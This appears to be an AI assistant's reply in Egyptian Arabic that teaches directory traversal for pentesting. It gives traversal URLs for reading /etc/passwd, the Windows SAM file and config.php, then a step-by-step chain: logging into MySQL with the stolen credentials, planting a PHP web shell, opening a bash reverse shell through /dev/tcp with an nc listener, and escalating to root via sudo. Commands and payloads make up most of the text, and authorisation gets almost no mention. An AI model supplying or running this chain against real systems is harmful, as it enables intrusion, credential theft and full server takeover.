تمام، هشرح لك "Directory Traversal" بعمق شديد، مع تركيز على الجانب العملي، الأوامر، والأكواد. هخلّص كل جزء بالعامية المصرية زي ما تكون بتسمع من صاحبك، وفي الآخر هقدم خطوات عملية للاستغلال في سياق Pentesting.

---

### **1. إيه هو Directory Traversal؟**

#### **الشرح العميق:**
"Directory Traversal" (أو Path Traversal) هو نوع من الثغرات الأمنية في تطبيقات الويب أو الأنظمة اللي بيسمح للمهاجم يطلع برا المجلد اللي المفروض محصور فيه ويوصل لملفات تانية في النظام. بمعنى تاني، التطبيق بياخد إدخال من المستخدم (زي اسم ملف في رابط)، لكن لو ما اتفلترش صح، المهاجم يقدر يستخدم حاجات زي `../` (في لينكس) أو `..\` (في ويندوز) عشان يتحرك لمجلدات أعلى ويفتح ملفات حساسة زي `/etc/passwd` أو `C:\Windows\system32\config\SAM`.

- **كيف بيحصل؟** لو التطبيق بيستخدم دالة زي `file_get_contents()` في PHP بدون ما يتحقق من الإدخال، المهاجم يقدر يعدي المسار المحدد.
- **الهدف:** قراءة ملفات مهمة أو كتابة ملفات لو الثغرة بتسمح.

#### **الأدوات والأوامر العملية:**
1. **فحص يدوي في الويب:**
   - لو رابط زي: `http://target.com/file?path=doc.pdf`.
   - جرب: `http://target.com/file?path=../etc/passwd` -> لو ظهر محتوى الملف، يبقى فيه Directory Traversal.

2. **استخدام curl:**
   - `curl http://target.com/file?path=../../etc/passwd` -> لو رجع بيانات، يبقى مفتوح.

3. **أدوات تلقائية:**
   - بـ Burp Suite: Intercept الطلب وعدل الـ Parameter لـ `path=../etc/passwd`.

#### **خلاصة بالعامية المصرية:**
"يعني زي ما تكون في أوضة في بيت، بس لقيت سلم سري يطلعك لأوض تانية المفروض ماتخشّهاش! Directory Traversal يعني بتطلع برا السجن بتاعك وتشوف أسرار البيت كله."

---

### **2. ليه المشكلة دي خطيرة؟**

#### **الشرح العميق:**
الثغرة دي خطيرة لأنها بتدي المهاجم وصول لملفات المفروض تكون مخفية أو محمية، وده بيفتح الباب لكذا حاجة:
- **سرقة بيانات حساسة:** زي ملفات الإعدادات (`config.php`) أو كلمات السر المشفرة (`/etc/shadow`).
- **كشف النظام:** يعرف إزاي النظام شغال (مثل إصدارات البرامج من ملفات النظام).
- **تصعيد صلاحيات:** لو قدر يكتب ملف (زي Shell)، يتحكم في السيرفر.

في الـ Pentesting، الثغرة دي كنز لأنها بتخليك تشوف حاجات المفروض محدش يشوفها وتستغلها عشان تكبر وصولك.

#### **الأدوات والأوامر العملية:**
1. **قراءة ملفات حساسة:**
   - `http://target.com/file?path=../../../../etc/passwd` -> ملف المستخدمين في لينكس.
   - `http://target.com/file?path=..\Windows\system32\config\SAM` -> ملف كلمات السر في ويندوز.

2. **استغلال لكشف أكواد:**
   - `http://target.com/file?path=../var/www/html/config.php` -> لو جاب كلمة سر قاعدة البيانات.

3. **اختبار متعمق:**
   - بـ wfuzz:
     - `wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 http://target.com/file?path=../../FUZZ`.

#### **خلاصة بالعامية المصرية:**
"الثغرة دي خطيرة لأنها زي ما تكون لقيت خريطة البيت كله، تقدر تفتح أي أوضة وتاخد اللي فيها! المهاجم يلاقيها، يبقى زي اللي مسك مفتاح الخزنة."

---

### **3. إزاي نستغلها في الـ Pentesting؟**
- **الهدف:** تستخدم Directory Traversal عشان تقرأ ملفات حساسة أو تكتب ملفات لو الثغرة بتسمح، وتوصل لتحكم أكبر.
- **مثال واقعي:** لو قدرت تقرأ `/etc/passwd`، تعرف المستخدمين، ولو لقيت `config.php`، تاخد كلمة سر قاعدة البيانات.

#### **خلاصة بالعامية المصرية:**
"لما تلاقي الثغرة دي، زي ما تكون لقيت باب سري في لعبة، تفتحه وتبقى الكبير بتاع الماتش من غير ما حد يحس!"

---

### **خطوات عملية للاستغلال في Pentesting**

#### **الخطوة 1: فحص الهدف**
- شغل Nmap:
  - `nmap -sV 192.168.1.10`.
- افترض النتيجة:
  - Port 80: Apache 2.4.29.

#### **الخطوة 2: البحث عن الثغرة**
- جرب رابط ياخد Parameter:
  - `http://192.168.1.10/file?path=image.jpg`.
  - عدله: `http://192.168.1.10/file?path=../etc/passwd` -> لو ظهر الملف، يبقى فيه Directory Traversal.
- لو ما نجحش، زوّد `../`:
  - `http://192.168.1.10/file?path=../../../../etc/passwd`.

#### **الخطوة 3: استغلال لقراءة ملفات**
- في لينكس:
  - `http://192.168.1.10/file?path=../../../../etc/passwd` -> تسريب المستخدمين.
  - `http://192.168.1.10/file?path=../../../../var/www/html/config.php` -> كلمة سر قاعدة البيانات.
- في ويندوز:
  - `http://192.168.1.10/file?path=..\..\Windows\system32\drivers\etc\hosts`.

#### **الخطوة 4: استخدام البيانات**
- لو لقيت في `config.php`:
  - `$db_user = "root"; $db_pass = "secret123";`.
  - `mysql -u root -psecret123 -h 192.168.1.10` -> `SELECT * FROM users;`.

#### **الخطوة 5: محاولة كتابة (لو ممكن)**
- لو الثغرة بتسمح بكتابة:
  - `http://192.168.1.10/file?path=../../../../var/www/html/shell.php&content=<?php system($_GET['cmd']); ?>`.
  - افتح: `http://192.168.1.10/shell.php?cmd=id` -> `www-data`.

#### **الخطوة 6: تصعيد الصلاحيات**
- من الـ Shell:
  - `http://192.168.1.10/shell.php?cmd=/bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1`.
  - `nc -lvnp 4444` -> Shell.
  - `id` -> `www-data` -> `sudo -l` -> لو لقيت `sudo /bin/bash`، نفذه -> `root`.

#### **الخطوة 7: توثيق**
- سجل الملفات اللي وصلت لها (زي `/etc/passwd` أو `config.php`).
- قدم تقرير يوضح إزاي الثغرة فتحت الباب لكل حاجة.

#### **خلاصة بالعامية المصرية:**
"الخطوات دي زي ما تكون لقيت خرم في السقف، طلعت منه، فتحت كل الأوض، وطلعت الكبير بتاع الحتة! Directory Traversal طريقك للفوز بسهولة لو لقيتها."

---

### **الخلاصة النهائية:**
Directory Traversal هي ثغرة كبيرة لأنها بتخلّيك تتحرك برا الحدود وتشوف أو تعدل ملفات حساسة. في الـ Pentesting، دور عليها في الروابط باستخدام `../` أو أدوات زي Burp، استغلها عشان تسرق بيانات أو تاخد Shell، ووري العميل إن نظامه زي بيت مفتوح من غير أسوار! بالطريقة دي، تبقى البطل بتاع اللعبة بكل سهولة!